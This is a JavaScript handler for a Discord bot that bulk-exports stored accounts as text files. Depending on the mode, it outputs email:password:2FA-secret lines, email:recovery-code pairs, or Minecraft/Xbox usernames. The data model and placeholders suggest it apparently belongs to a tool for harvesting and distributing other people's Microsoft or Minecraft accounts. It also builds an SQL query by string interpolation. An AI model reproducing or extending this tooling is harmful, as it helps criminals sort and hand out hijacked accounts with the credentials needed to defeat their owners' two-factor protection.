const { ActionRowBuilder, ButtonBuilder, ButtonStyle, AttachmentBuilder, EmbedBuilder } = require("discord.js");
const { queryParams } = require("../../../db/database");

module.exports = {
    name: "massdownload",
    callback: async (client, interaction) => {
        const [_, type, userId] = interaction.customId.split("|");

        let embed = new EmbedBuilder().setColor(0x808080);

        if (interaction.user.id !== userId) {
            return interaction.reply({ content: "You didn't initiate this download.", ephemeral: true });
        }

        await interaction.deferReply({ ephemeral: true });

        try {
            let fileContent, filename;
            const excludedUsernames = ["No Xbox Profile!", "No Minecraft!", "Couldn't find!"];

            const userUIDsQuery = "SELECT uid, time FROM accountsbyuser WHERE user_id = ? ORDER BY time DESC";
            const userUIDs = await queryParams(userUIDsQuery, [userId]);

            if (!userUIDs || userUIDs.length === 0) {
                embed.setTitle("No Accounts");
                embed.setDescription("You don't have any accounts yet.");
                return interaction.editReply({ embeds: [embed] });
            }

            const userAccountsQuery = `SELECT a.*, ab.time 
                                       FROM accounts a 
                                       JOIN accountsbyuser ab ON a.uid = ab.uid 
                                       WHERE a.uid IN (${userUIDs.map(u => `'${u.uid}'`).join(', ')})`;
            const userAccounts = await queryParams(userAccountsQuery);

            if (!userAccounts || userAccounts.length === 0) {
                embed.setTitle("No Accounts");
                embed.setDescription("You don't have any accounts yet. Click the button below to add one.");
                return interaction.editReply({ embeds: [embed] });
            }

            switch (type) {
                case "secretkey": {
                    const latestAccounts = {};
                    for (const acc of userAccounts) {
                        if (acc.email && acc.password && acc.secretkey) {
                            if (
                                !latestAccounts[acc.email] ||
                                Number(acc.time) > Number(latestAccounts[acc.email].time)
                            ) {
                                latestAccounts[acc.email] = acc;
                            }
                        }
                    }

                    const validAccounts = Object.values(latestAccounts);
                    if (validAccounts.length === 0) break;

                    fileContent = validAccounts
                        .map(acc => {
                            const cleanedSecretKey = acc.secretkey.replace(/\s+/g, '');
                            return `${acc.email}:${acc.password}:${cleanedSecretKey}`;
                        })
                        .join('\n');
                    filename = `secretkeys_${Date.now()}.txt`;
                    break;
                }

                case "recovery": {
                    const latestAccounts = {};
                    for (const acc of userAccounts) {
                        if (acc.email && acc.recoverycode) {
                            if (
                                !latestAccounts[acc.email] ||
                                Number(acc.time) > Number(latestAccounts[acc.email].time)
                            ) {
                                latestAccounts[acc.email] = acc;
                            }
                        }
                    }

                    const validAccounts = Object.values(latestAccounts);
                    if (validAccounts.length === 0) break;

                    fileContent = validAccounts
                        .map(acc => `${acc.email}:${acc.recoverycode}`)
                        .join('\n');
                    filename = `recovery_${Date.now()}.txt`;
                    break;
                }

                case "usernames": {
                    const validUsernames = userAccounts
                        .filter(acc => acc.username && !excludedUsernames.includes(acc.username))
                        .map(acc => acc.username);

                    const uniqueUsernames = [...new Set(validUsernames)];

                    if (uniqueUsernames.length === 0) break;

                    fileContent = uniqueUsernames.join('\n');
                    filename = `usernames_${Date.now()}.txt`;
                    break;
                }

                default:
                    return interaction.editReply({ content: "Invalid download type.", ephemeral: true });
            }

            if (!fileContent) {
                embed.setTitle("No Data Available");
                embed.setDescription(`No ${type} data found in your accounts.`);
                return interaction.editReply({ embeds: [embed] });
            }

            const buffer = Buffer.from(fileContent, 'utf-8');
            const attachment = new AttachmentBuilder(buffer, { name: filename });

            await interaction.editReply({
                content: `Here's your ${type} download:`,
                files: [attachment],
                ephemeral: true
            });

        } catch (error) {
            console.error("Error in massdownload:", error);
            await interaction.editReply({
                content: "An error occurred while preparing your download.",
                ephemeral: true
            });
        }
    }
};
